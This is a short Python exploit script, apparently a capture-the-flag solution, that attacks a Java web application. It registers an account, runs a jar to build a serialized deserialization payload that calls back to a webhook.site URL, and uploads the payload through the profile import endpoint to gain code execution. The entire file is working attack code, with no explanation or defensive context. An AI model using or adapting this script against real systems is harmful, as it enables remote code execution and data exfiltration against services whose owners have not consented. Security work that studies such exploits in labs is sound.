import requests
import subprocess

WEBHOOK = "https://webhook.site/xxxxx" # change this
VICTIM = "http://localhost:1337/" # change this

def register(username, password, session):
    url = f"{VICTIM}/auth/register"
    data = {
        "username": username,
        "password": password
    }
    response = session.post(url, data=data)
    if "Username already exists" in response.text:
        return login(username, password, session)

    jsessionid = response.cookies.get("JSESSIONID")
    return jsessionid

def login(username, password, session):
    url = f"{VICTIM}/auth/login"
    data = {
        "username": username,
        "password": password
    }
    response = session.post(url, data=data)
    jsessionid = session.cookies.get("JSESSIONID")
    return jsessionid

def exploit(session):
    proc = subprocess.Popen(["java", "-jar", "payload-1.0.jar", WEBHOOK], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # proc = subprocess.Popen(["D:\\Java\\jdk-17\\bin\\java.exe", "-jar", "exploit-1.0.jar", WEBHOOK], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    proc.wait()
    
    url = f"{VICTIM}/profile"
    data = {"action": "import"}
    payload = open("payload.ser", "rb")
    
    response = session.post(url, files={"importFile": payload}, data=data)
    return True

def main():
    session = requests.session()
    jsessionid = register("hehe", "hehe", session)
    if exploit(session):
        print(f"Payload sent. Check your webhook: {WEBHOOK}")
    else:
        print("Payload not sent")

if __name__ == "__main__":
    main()
